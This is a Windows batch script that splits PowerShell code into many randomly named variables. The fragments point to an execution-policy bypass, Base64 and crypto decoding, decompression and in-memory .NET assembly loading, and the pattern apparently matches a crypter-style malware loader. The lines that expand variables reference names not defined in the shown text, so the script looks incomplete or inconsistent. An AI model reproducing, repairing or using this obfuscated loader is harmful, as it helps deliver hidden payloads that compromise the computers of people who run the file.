@echo off
set "GonDjPmGrc=$wFg"
set "xXpZmHflpb=$osR"
set "PHuiEREcze=.-16"
set "jRnMAymKhx=pStr"
set "yaNJTWJEdM=();$"
set "YFlhTlUBoU=();$"
set "uAkLNFdkaW=C = "
set "bfWwqlIIfN=Conv"
set "IUuGmBylrI=O.Me"
set "ZAPqHjRkbq=8kuY"
set "SmGGNHCQlG=in $"
set "mncwxBjflw=gth)"
set "VrvRCcgGWU=-nop"
set "OPqDNqTpyT=stem"
set "TFMnfOanrL=oryS"
set "toiwunjvqE=Fgoz"
set "GbybveAtnU=oz);"
set "jzkusxMRrB=Comp"
set "eqrquhrQKb=am;$"
set "vuHozUlIch=-ep "
set "OQaoPJXgZZ=brea"
set "vDZxcwsiAY=$osR"
set "pdJhEPfWDs=lit("
set "spHJMnLqlm=g = "
set "qqjTNjAyln=osRK"
set "WBcTpkcNdI=t Sy"
set "ngKpiNpsif=$wFg"
set "HUTaVvVIom=tem."
set "FQHBsJAbLm=Disp"
set "DlTIJMAeKH=..-1"
set "xigMaGocTU=)) {"
set "WflbyXnNbg=::De"
set "McTcZhQqJv=fPLY"
set "BzGKWKSKPz= New"
set "UyEFlsPcrY= = ["
set "aKHBDMEnvc=d;$t"
set "GanzYembZp=::('"
set "NfUzqIjaUl=Secu"
set "wcWimQAXjY=yTo("
set "CNOveHyhEr=em.C"
set "yrPTwlORoY= if "
set "jJUhYbfEnU=tBnN"
set "dYqiUNISwQ=DNJS"
set "kUXTtPQdJi=[Sys"
set "KOgeHrXaKP=, $o"
set "CCcIOmlDRX=TllA"
set "DMDaXjXUfV=yste"
set "JUcAEfkzoc=);$w"
set "qIZTBdOZhO=]::N"
set "ASuWCCJJCF=($wo"
set "mmfuAnmYMP='')("
set "hpkeDYifxp=[-1."
set "nBNbyZsujA=form"
set "blwuPMlPXP=join"
set "zUxfWyNAQC=embl"
set "DkWjaZDJzT=asC."
set "JrFuQqWqck=;$iE"
set "LDIFGsavau=e = "
set "kKplOgxFyJ=-4] "
set "XywVidEczF=y.Cr"
set "UHpBZTBbND=);$t"
set "FwqapCEJVt=oz ="
set "zUuactEfpO=wAny"
set "shZswtkeVV=-1.."
set "VFCIAPjwWa=em.I"
set "uNoqCEWEoj=flec"
set "YngioTpJun=7kGw"
set "XNynrKAhlA=oint"
set "XlMQQyGWIi=Wyqo"
set "AtbqQfOFZx=;$je"
set "MOTHdIXHWf=aDNK"
set "iCqhXVntUX=.Mem"
set "UWHdqcmoZd=ke($"
set "AygUDSeMkz= [st"
set "jswPSUEtrW= = $"
set "KfUMpwUejj=G) {"
set "oahcGEHxUz=R5jf"
set "mlnmUcanSl=6] -"
set "WIxRimxXim=eam("
set "jFQvNcgooR=y.Pa"
set "oQKknZrAXF=ss -"
set "DoByCiYfwY=Disp"
set "etmfTmrNKN=BnNj"
set "TtbgaAeZpJ=);$I"
set "spgKErUPag=.Key"
set "nxoiREykSa=, (,"
set "OodkheZqls=sRKd"
set "WMppdlYqmI=d = "
set "tYgdgzuWTi=uFVa"
set "YIqhqlCdKI==');"
set "YHIQCgBoFM=morF"
set "tCddynScHy=comm"
set "OjqZDcZNhp=F'[-"
set "lSaxZbavtH=ose("
set "meXdSckyyt=y]::"
set "WhSVajZQlz=y.Ci"
set "XFSjJtreur=7;$t"
set "mDJjSVSIWU=CuSj"
set "vjYHJlUCUZ=oL'["
set "tJdsOcVBEO=; };"
set "qFYPGLdNSC=sC, "
set "gHHJFvAQFz=Syst"
set "gJpVLNugIx=]::("
set "ghQiLFUzMi=[Env"
set "RkZMVfMIAN= [Sy"
set "CUcoIgfZFV=Mode"
set "KoQHlXIaHe=16] "
set "BrzvdzmmFo=3); "
set "XKZVurPzTX=kyhK"
set "YZQjdFmRAI=New-"
set "xgzeLqHgjx=ing("
set "YipSjLOhXm=pose"
set "EQnTepTJoo=-Obj"
set "kMfvvZzCKg=$pia"
set "qoIKBplPkJ=IhQc"
set "GpaOHAuEcI=ionM"
set "EaPHJTlmiI=ypto"
set "pkMuFBbbSO=bjec"
set "cGAfTkQRrR=ment"
set "eRWJnwLKSm=;$pi"
set "fTvsEHoDWZ=join"
set "dZpbINNZgQ= '')"
set "PNzSjXjwhn=Nj.I"
set "ISDqiMliWt=);$t"
set "MxHciheADQ=Star"
set "fxoGDCyQbQ=Fina"
set "MIjGhZUEWc=$tBn"
set "OgqueaiDXr=m(, "
set "lbZFhvyOld='gni"
set "zcxdfWWpNe=$wFg"
set "uRpWzzjrBf=m.Re"
set "qpHtlbHbmT=k; }"
set "mHDVypgzMP=hQcG"
set "onoZBljxYt=tem."
%VmAoywwGUL%%noZpIIlCku%%mLkgdsSZXR%%luVQHjfRQc%%mBVrsRPwqu%%XCDJqkculg%%ExIdzTsjIy%%DuLiiLPSNl%%CwJDTJQmAw%%hLFKyOSSSz%%zFORQDQuAE%%ujGZDiNfjQ%%dgJlrSObKu%%TWaoMXHRMq%%SvLVcXeGhp%%aMIcwtWCAY%%PPKgKyjrnF%%AWtTXHuNjt%%NiUutgnYSt%%berNAdLFlD%%NNsBPetPeO%%YitglGUpND%%klzUEvEFsT%%WPCFGaPsEo%%NyTduSLkCU%%jvRHtCnyWu%%ANwlSjFOAk%%RBLzQLsvzM%%KtdyKAXVle%%MqwkOZbHll%%nWKrcHKsQH%%jSZkJgKYBr%%lJCwyBfALQ%"%~dp0%~nx0.exe"
cls
%YeGulGAEkp%%CIrtZwMorI%
